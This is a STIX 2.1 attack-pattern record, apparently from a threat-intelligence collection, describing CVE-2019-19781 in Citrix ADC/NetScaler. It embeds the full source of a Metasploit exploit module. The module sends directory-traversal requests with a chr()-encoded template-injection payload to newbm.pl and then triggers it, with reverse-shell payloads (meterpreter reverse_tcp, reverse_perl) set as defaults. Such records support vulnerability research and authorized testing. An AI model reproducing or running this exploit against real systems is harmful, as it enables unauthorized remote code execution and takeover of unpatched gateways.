{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f1f811c9-f4e7-45cd-899b-6e9665297ad4",
    "created": "2024-08-14T16:33:42.68532Z",
    "modified": "2024-08-14T16:33:42.685324Z",
    "name": "Citrix ADC (NetScaler) Directory Traversal RCE",
    "description": " This module exploits a directory traversal in Citrix Application Delivery Controller (ADC), aka NetScaler, and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0, to execute an arbitrary command payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/http/citrix_dir_traversal_rce.rb",
            "external_id": "citrix_dir_traversal_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-19781"
        },
        {
            "source_name": "reference",
            "url": "https://support.citrix.com/article/CTX267027/"
        },
        {
            "source_name": "reference",
            "url": "https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/"
        },
        {
            "source_name": "reference",
            "url": "https://swarm.ptsecurity.com/remote-code-execution-in-citrix-adc/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::CheckModule\n  include Msf::Exploit::FileDropper\n  include Msf::Module::Deprecated\n\n  moved_from 'exploit/linux/http/citrix_dir_traversal_rce'\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                => 'Citrix ADC (NetScaler) Directory Traversal RCE',\n      'Description'         => %q{\n        This module exploits a directory traversal in Citrix Application Delivery Controller (ADC), aka\n        NetScaler, and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0, to execute an arbitrary command payload.\n      },\n      'Author'              => [\n        'Mikhail Klyuchnikov',          # Discovery\n        'Project Zero India',           # PoC used by this module\n        'TrustedSec',                   # PoC used by this module\n        'James Brytan',                 # PoC contributed independently\n        'James Smith',                  # PoC contributed independently\n        'Marisa Mack',                  # PoC contributed independently\n        'Rob Vinson',                   # PoC contributed independently\n        'Sergey Pashevkin',             # PoC contributed independently\n        'Steven Laura',                 # PoC contributed independently\n        'mekhalleh (RAMELLA S\u00e9bastien)' # Module author (https://www.pirates.re/)\n      ],\n      'References'          => [\n        ['CVE', '2019-19781'],\n        ['EDB', '47901'],\n        ['EDB', '47902'],\n        ['URL', 'https://support.citrix.com/article/CTX267027/'],\n        ['URL', 'https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/'],\n        ['URL', 'https://swarm.ptsecurity.com/remote-code-execution-in-citrix-adc/']\n      ],\n      'DisclosureDate'      => '2019-12-17',\n      'License'             => MSF_LICENSE,\n      'Platform'            => ['python', 'unix'],\n      'Arch'                => [ARCH_PYTHON, ARCH_CMD],\n      'Privileged'          => false,\n      'Targets'             => [\n        ['Python',\n          'Platform'        => 'python',\n          'Arch'            => ARCH_PYTHON,\n          'Type'            => :python,\n          'DefaultOptions'  => {'PAYLOAD' => 'python/meterpreter/reverse_tcp'}\n        ],\n        ['Unix Command',\n          'Platform'        => 'unix',\n          'Arch'            => ARCH_CMD,\n          'Type'            => :unix_cmd,\n          'DefaultOptions'  => {'PAYLOAD' => 'cmd/unix/reverse_perl'}\n        ]\n      ],\n      'DefaultTarget'       => 0,\n      'DefaultOptions'      => {\n        'CheckModule'       => 'auxiliary/scanner/http/citrix_dir_traversal',\n        'HttpClientTimeout' => 3.5\n      },\n      'Notes'               => {\n        'AKA'               => ['Shitrix'],\n        'Stability'         => [CRASH_SAFE],\n        'Reliability'       => [REPEATABLE_SESSION],\n        'SideEffects'       => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n      }\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def cmd_unix_generic?\n    datastore['PAYLOAD'] == 'cmd/unix/generic'\n  end\n\n  def exploit\n    print_status(\"Yeeting #{datastore['PAYLOAD']} payload at #{peer}\")\n    vprint_status(\"Generated payload: #{payload.encoded}\")\n\n    case target['Type']\n    when :python\n      execute_command(%(/var/python/bin/python2 -c \"#{payload.encoded}\"))\n    when :unix_cmd\n      if (res = execute_command(payload.encoded)) && cmd_unix_generic?\n        print_line(res.get_html_document.text.gsub(/undef error - Attempt to bless.*/m, ''))\n      end\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    filename = rand_text_alpha(8..42)\n    nonce    = rand_text_alpha(8..42)\n\n    res = send_request_cgi(\n      'method'      => 'POST',\n      'uri'         => normalize_uri(target_uri.path, '/vpn/../vpns/portal/scripts/newbm.pl'),\n      'headers'     => {\n        'NSC_USER'  => \"../../../netscaler/portal/templates/#{filename}\",\n        'NSC_NONCE' => nonce\n      },\n      'vars_post'   => {\n        'url'       => rand_text_alpha(8..42),\n        'title'     => \"[%template.new({'BLOCK'='print readpipe(#{chr_payload(cmd)})'})%]\"\n      }\n    )\n\n    unless res && res.code == 200\n      print_error('No response to POST newbm.pl request')\n      return\n    end\n\n    res = send_request_cgi(\n      'method'      => 'GET',\n      'uri'         => normalize_uri(target_uri.path, \"/vpn/../vpns/portal/#{filename}.xml\"),\n      'headers'     => {\n        'NSC_USER'  => rand_text_alpha(8..42),\n        'NSC_NONCE' => nonce\n      },\n      'partial'     => true\n    )\n\n    unless res && res.code == 200\n      print_warning(\"No response to GET #{filename}.xml request\")\n    end\n\n    register_files_for_cleanup(\n      \"/netscaler/portal/templates/#{filename}.xml\",\n      \"/var/tmp/netscaler/portal/templates/#{filename}.xml.ttc2\"\n    )\n\n    res\n  end\n\n  def chr_payload(cmd)\n    cmd.each_char.map { |c| \"chr(#{c.ord})\" }.join('.')\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-12-17",
    "x_mitre_platforms": [
        "unix'"
    ]
}